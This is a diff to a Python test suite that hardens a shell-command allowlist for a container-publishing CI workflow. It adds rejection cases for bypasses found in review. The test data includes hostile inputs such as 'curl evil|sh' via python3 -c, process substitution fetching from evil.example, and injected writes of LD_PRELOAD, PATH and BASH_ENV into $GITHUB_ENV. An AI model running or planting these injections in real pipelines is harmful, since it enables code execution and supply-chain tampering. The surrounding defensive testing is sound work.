@@ -615,6 +615,39 @@ ALLOWED_REDIRECTIONS = {
 }
 SEPARATORS = {";", "&&", "||", "|", "|&", "&", "(", ")"}
 REDIRECTIONS = {">", ">>", "<", "<<", "<<<", ">&", "<&", "&>", ">|"}
+# shlex (punctuation_chars) returns every run of these characters as one token.
+# Such a token must be a separator or a redirection on ALLOWED_REDIRECTIONS;
+# anything else (&>>, <>, >>&, <(, >(, ((, ;;, ...) is rejected outright.
+SHELL_PUNCTUATION = set("();<>|&")
+# The only tokens allowed between [[ and ]] that are operators; test operators
+# such as -eq/-lt (arithmetic: `[[ 1 -eq PATH=1 ]]` assigns PATH) and -v
+# (evaluates array subscripts, which can run commands) are rejected.
+TEST_PUNCTUATION = {"||", "&&", "(", ")"}
+# `[` / `test` options the workflow uses; -v would evaluate array subscripts.
+TEST_OPERATORS = {"-n", "-z"}
+# Parameter expansion: only ${NAME}, and ${{ ... }} (GitHub expressions, replaced
+# before bash runs). ${X:=v} assigns, ${H@P} runs $(...) found in H's value, and
+# offsets/subscripts (${X:$A}, ${a[$A]}) and $[...] evaluate arithmetic, which
+# runs a[$(cmd)] found in a value such as $HEALTH (the candidate's output).
+PARAMETER_EXPANSION = re.compile(r"\$(\{(?!\{)(?![A-Za-z_][A-Za-z0-9_]*\})|\[)")
+# <(...) and >(...) run their contents as a command that is never checked.
+PROCESS_SUBSTITUTION = re.compile(r"[<>]\(")
+# Exact argv of the publish job's printf and python3 lines. printf -v NAME
+# would assign any variable; python3 -c could run any code after the prefix.
+PRINTF_ARGS = ["%s\\n", "$INSPECT_ERROR"]
+HEALTH_CHECK = (
+    "import json,sys; data=json.loads(sys.argv[4]); assert data == "
+    '{"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], '
+    '"schema_version": sys.argv[3]}'
+)
+PYTHON_ARGS = [
+    "-c",
+    HEALTH_CHECK,
+    "${{ steps.version.outputs.value }}",
+    "${{ github.sha }}",
+    "${{ steps.version.outputs.schema }}",
+    "$HEALTH",
+]
 
 
 def _logical_lines(script: str) -> list[str]:
@@ -659,12 +692,23 @@ def _simple_commands(line: str, problems: list[str]) -> list[list[str]]:
     in_test = False
     while index < len(tokens):
         token = tokens[index]
-        if token == "[[":
+        operator = set(token) <= SHELL_PUNCTUATION
+        if not operator and ("<" in token or ">" in token):
+            problems.append(f"'<' or '>' inside the word {token!r} is not allowed: {line}")
+        if token == "[[" and all(word in SHELL_KEYWORDS for word in current):
+            # Only a [[ in command position opens a test; `echo [[ ; curl ...`
+            # is two commands.
             in_test = True
         if in_test:
-            # Inside [[ ... ]] operators such as || and < are test syntax.
+            if operator and token not in TEST_PUNCTUATION:
+                problems.append(f"operator {token!r} inside [[ ]] is not allowed: {line}")
+            if token.startswith("-"):
+                problems.append(f"test operator {token} inside [[ ]] is not allowed: {line}")
             current.append(token)
             in_test = token != "]]"
+        elif operator and token not in SEPARATORS and token not in REDIRECTIONS:
+            problems.append(f"shell operator {token!r} is not allowed: {line}")
+            current.append(token)
         elif token in SEPARATORS:
             commands.append(current)
             current = []
@@ -679,6 +723,8 @@ def _simple_commands(line: str, problems: list[str]) -> list[list[str]]:
         else:
             current.append(token)
         index += 1
+    if in_test:
+        problems.append(f"unterminated [[: {line}")
     commands.append(current)
     simple = []
     for words in commands:
@@ -773,6 +819,11 @@ def _disallowed_commands(script: str) -> list[str]:
             # nested in them would hide behind an allowed one such as echo.
             problems.append(f"backtick command substitution: {line}")
             continue
+        if PROCESS_SUBSTITUTION.search(line):
+            problems.append(f"process substitution: {line}")
+            continue
+        if PARAMETER_EXPANSION.search(line):
+            problems.append(f"parameter expansion other than ${{NAME}}: {line}")
         for words in _simple_commands(line, problems):
             command = words[0]
             if command not in ALLOWED_COMMANDS:
@@ -781,13 +832,14 @@ def _disallowed_commands(script: str) -> list[str]:
                 problems.extend(_docker_problems(words, line))
             elif command == "curl":
                 problems.extend(_curl_problems(words, line))
-            elif command == "python3":
-                if (
-                    len(words) < 3
-                    or words[1] != "-c"
-                    or not words[2].startswith("import json,sys;")
-                ):
-                    problems.append(f"python3 other than the stdlib json check: {line}")
+            elif command == "python3" and words[1:] != PYTHON_ARGS:
+                problems.append(f"python3 other than the workflow's health check: {line}")
+            elif command == "printf" and words[1:] != PRINTF_ARGS:
+                problems.append(f"printf other than the workflow's: {line}")
+            elif command in {"[", "test"} and any(
+                word.startswith("-") and word not in TEST_OPERATORS for word in words[1:]
+            ):
+                problems.append(f"test operator other than {sorted(TEST_OPERATORS)}: {line}")
             elif command == "openssl" and words[1:2] != ["rand"]:
                 problems.append(f"openssl other than rand: {line}")
     return problems
@@ -866,30 +918,53 @@ LATEST_TAG = '"${IMAGE_NAME}:latest"'
 PROMOTE = f"docker buildx imagetools create --tag {VERSION_TAG} --tag {LATEST_TAG} "
 
 
-# Verbatim forms from publish-container.yml; the tightened allowlist must keep
-# accepting them (test_publish_job_runs_only_allowlisted_commands checks the
-# real file; these pin each form on its own).
-@pytest.mark.parametrize(
-    "script",
-    [
-        "docker pull " + CANDIDATE_IMAGE,
-        CANDIDATE_RUN + "-e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 " + CANDIDATE_IMAGE,
-        PROMOTE + CANDIDATE_IMAGE,
-        f'VERSION_DIGEST="$(docker buildx imagetools inspect {VERSION_TAG} '
-        "--format '{{json .Manifest.Digest}}' | tr -d '\"')\"",
-        f'if INSPECT_ERROR="$(docker manifest inspect {VERSION_TAG} 2>&1)"; then exit 1; fi',
-        "if ! grep -Eqi 'manifest unknown|not found' <<<\"$INSPECT_ERROR\"; then exit 1; fi",
-        'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
-        "VERSION=\"$(tr -d '\\r\\n' < VERSION)\"",
-        'echo "value=$VERSION" >> "$GITHUB_OUTPUT"',
-        'echo "VERSION $VERSION does not match" >&2',
-        "printf '%s\\n' \"$INSPECT_ERROR\" >&2",
-        "for _ in $(seq 1 30); do sleep 2; done",
-        "docker logs ghidra-mcp-ci",
-        "docker rm -f ghidra-mcp-ci 2>/dev/null || true",
-    ],
-)
+# Verbatim logical lines (whitespace-normalized) of publish-container.yml's
+# publish job, minus bare exit/fi/break/done. Each must still be in the workflow
+# and must pass the allowlist; test_publish_job_runs_only_allowlisted_commands
+# additionally checks the whole real file.
+PRODUCTION_FORMS = [
+    "VERSION=\"$(tr -d '\\r\\n' < VERSION)\"",
+    '[[ "$VERSION" =~ ^[0-9]{8}\\.[1-9][0-9]*$ ]]',
+    'if [[ "$GITHUB_REF_NAME" != "v$VERSION" || "$VERSION" != "$TESTED_VERSION" ]]; then',
+    'echo "VERSION $VERSION does not match tag $GITHUB_REF_NAME or tested version $TESTED_VERSION" >&2',
+    '[[ "$TESTED_SCHEMA" =~ ^[0-9a-f]{16}$ ]]',
+    'echo "value=$VERSION" >> "$GITHUB_OUTPUT"',
+    'echo "schema=$TESTED_SCHEMA" >> "$GITHUB_OUTPUT"',
+    'if INSPECT_ERROR="$(docker manifest inspect "${IMAGE_NAME}:${{ steps.version.outputs.value }}" 2>&1)"; then',
+    'echo "Version tag already exists: ${IMAGE_NAME}:${{ steps.version.outputs.value }}" >&2',
+    "if ! grep -Eqi 'manifest unknown|not found' <<<\"$INSPECT_ERROR\"; then",
+    'echo "Could not prove that the version tag is unused:" >&2',
+    "printf '%s\\n' \"$INSPECT_ERROR\" >&2",
+    'docker pull "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
+    'TOKEN="$(openssl rand -hex 32)"',
+    'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
+    'HEALTH=""',
+    "for _ in $(seq 1 30); do",
+    'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
+    'if [ -n "$HEALTH" ]; then',
+    'python3 -c \'import json,sys; data=json.loads(sys.argv[4]); assert data == {"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], "schema_version": sys.argv[3]}\' "${{ steps.version.outputs.value }}" "${{ github.sha }}" "${{ steps.version.outputs.schema }}" "$HEALTH"',
+    "sleep 2",
+    'if [ -z "$HEALTH" ]; then',
+    "docker logs ghidra-mcp-ci",
+    'docker buildx imagetools create --tag "${IMAGE_NAME}:${{ steps.version.outputs.value }}" --tag "${IMAGE_NAME}:latest" "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
+    'VERSION_DIGEST="$(docker buildx imagetools inspect "${IMAGE_NAME}:${{ steps.version.outputs.value }}" --format \'{{json .Manifest.Digest}}\' | tr -d \'"\')"',
+    'test "$VERSION_DIGEST" = "${{ steps.image.outputs.digest }}"',
+    "docker rm -f ghidra-mcp-ci 2>/dev/null || true",
+]
+
+
+def _production_lines() -> set[str]:
+    return {
+        " ".join(line.split())
+        for step in _jobs()["publish"]
+        if step.run is not None and step.shell != "python3 {0}"
+        for line in _logical_lines(step.run)
+    }
+
+
+@pytest.mark.parametrize("script", PRODUCTION_FORMS)
 def test_publish_command_allowlist_accepts_the_forms_in_use(script: str) -> None:
+    assert script in _production_lines()
     assert _disallowed_commands(script) == []
 
 
@@ -956,6 +1031,125 @@ def test_publish_command_allowlist_accepts_the_forms_in_use(script: str) -> None
 )
 def test_publish_command_allowlist_rejects_review_r2_gaps(script: str) -> None:
     assert _disallowed_commands(script)
+
+
+# SAF-44 round 3: bypasses found in the second PR #17 review, plus siblings of
+# the same classes (assignment without `NAME=`, commands hidden in an allowed
+# command). Each passed the round-2 allowlist. The expected reason is asserted
+# so that dropping a check fails its case even when another check also fires.
+@pytest.mark.parametrize(
+    ("script", "reason"),
+    [
+        # Unknown redirection operators, including writes to $GITHUB_ENV.
+        pytest.param(
+            'echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"',
+            "shell operator '&>>'",
+            id="andappend-github-env",
+        ),
+        pytest.param("echo pwned &>>/tmp/evil", "shell operator '&>>'", id="redir-andappend"),
+        pytest.param(
+            "echo pwned 1<>/home/runner/.docker/config.json",
+            "shell operator '<>'",
+            id="redir-rw",
+        ),
+        pytest.param("echo pwned <>/tmp/evil", "shell operator '<>'", id="redir-rw-nofd"),
+        pytest.param(
+            'echo "PATH=/evil" 1<> "$GITHUB_ENV"', "shell operator '<>'", id="rw-github-env"
+        ),
+        pytest.param('echo x >>& "$GITHUB_ENV"', "shell operator '>>&'", id="appendamp-github-env"),
+        pytest.param("echo $((PATH=5))", "shell operator '(('", id="arith-assign"),
+        pytest.param(
+            "echo 'x>/tmp/evil'", "'<' or '>' inside the word", id="quoted-angle-bracket-word"
+        ),
+        # printf only in the workflow's form: printf -v assigns any variable.
+        pytest.param("printf -v PATH '%s' /tmp/evil", "printf other than", id="printf-v-PATH"),
+        pytest.param(
+            "printf -v IMAGE_NAME '%s' ghcr.io/evil/x", "printf other than", id="printf-v-IMAGE"
+        ),
+        pytest.param(
+            "printf -v BASH_ENV '%s' /tmp/evil", "printf other than", id="printf-v-BASH_ENV"
+        ),
+        pytest.param(
+            'printf \'%s\\n\' "$INSPECT_ERROR" "$TOKEN"', "printf other than", id="printf-extra"
+        ),
+        # Other ways to assign a variable without NAME=value.
+        pytest.param(
+            'echo "${BASH_ENV:=/tmp/evil}"',
+            "parameter expansion other than",
+            id="expansion-colon-assign",
+        ),
+        pytest.param(
+            'echo "${LD_PRELOAD=/tmp/x.so}"',
+            "parameter expansion other than",
+            id="expansion-assign",
+        ),
+        pytest.param('echo "${HEALTH@P}"', "parameter expansion other than", id="expansion-prompt"),
+        pytest.param(
+            'echo "${VERSION:$HEALTH}"', "parameter expansion other than", id="expansion-offset"
+        ),
+        pytest.param(
+            'echo "${VERSION[$HEALTH]}"', "parameter expansion other than", id="expansion-subscript"
+        ),
+        pytest.param(
+            'echo "${!HEALTH}"', "parameter expansion other than", id="expansion-indirect"
+        ),
+        pytest.param('echo "$[HEALTH]"', "parameter expansion other than", id="legacy-arith"),
+        pytest.param(
+            "[[ 1 -eq PATH=1 ]]", "test operator -eq inside [[ ]]", id="dbl-bracket-arith-assign"
+        ),
+        pytest.param(
+            "HEALTH=$'a[\\x24(id >&2)]'; [[ \"$HEALTH\" -eq 0 ]]",
+            "test operator -eq inside [[ ]]",
+            id="arith-subscript",
+        ),
+        pytest.param("[[ -v $HEALTH ]]", "test operator -v inside [[ ]]", id="dbl-bracket-v"),
+        pytest.param('[ -v "$HEALTH" ]', "test operator other than", id="single-bracket-v"),
+        pytest.param('test -v "$HEALTH"', "test operator other than", id="test-v"),
+        # Commands hidden inside an allowed command.
+        pytest.param(
+            "echo <(curl -fsS http://evil.example/)", "process substitution", id="procsub-in"
+        ),
+        pytest.param("echo >(dd of=/tmp/evil)", "process substitution", id="procsub-out-arg"),
+        pytest.param("grep x <(python3 -c 'import os')", "process substitution", id="procsub-grep"),
+        pytest.param("echo x > >(cat > /tmp/evil)", "process substitution", id="procsub-redirect"),
+        pytest.param(
+            "python3 -c 'import json,sys; import os; os.system(\"curl evil|sh\")'",
+            "python3 other than",
+            id="python-arbitrary",
+        ),
+        pytest.param(
+            "python3 -c '" + HEALTH_CHECK + '; import os\' a b c "$HEALTH"',
+            "python3 other than",
+            id="python-suffix",
+        ),
+        pytest.param(
+            "python3 -c '" + HEALTH_CHECK + '\' a b c "$HEALTH" extra',
+            "python3 other than",
+            id="python-extra-arg",
+        ),
+        pytest.param(
+            "python3 -I -c '" + HEALTH_CHECK + "'", "python3 other than", id="python-option"
+        ),
+        pytest.param(
+            "echo [[ ; curl http://evil.example/ ]]",
+            "curl outside localhost",
+            id="dbl-bracket-not-in-command-position",
+        ),
+        pytest.param(
+            '[[ "$VERSION" =~ x ; curl http://evil.example/',
+            "unterminated [[",
+            id="dbl-bracket-unterminated",
+        ),
+        pytest.param(
+            '[[ "$VERSION" =~ x ; curl http://evil.example/ ]]',
+            "operator ';' inside [[ ]]",
+            id="dbl-bracket-separator",
+        ),
+    ],
+)
+def test_publish_command_allowlist_rejects_review_r3_gaps(script: str, reason: str) -> None:
+    problems = _disallowed_commands(script)
+    assert any(reason in problem for problem in problems), problems
 
 
 def test_publish_job_runs_only_allowlisted_commands() -> None:
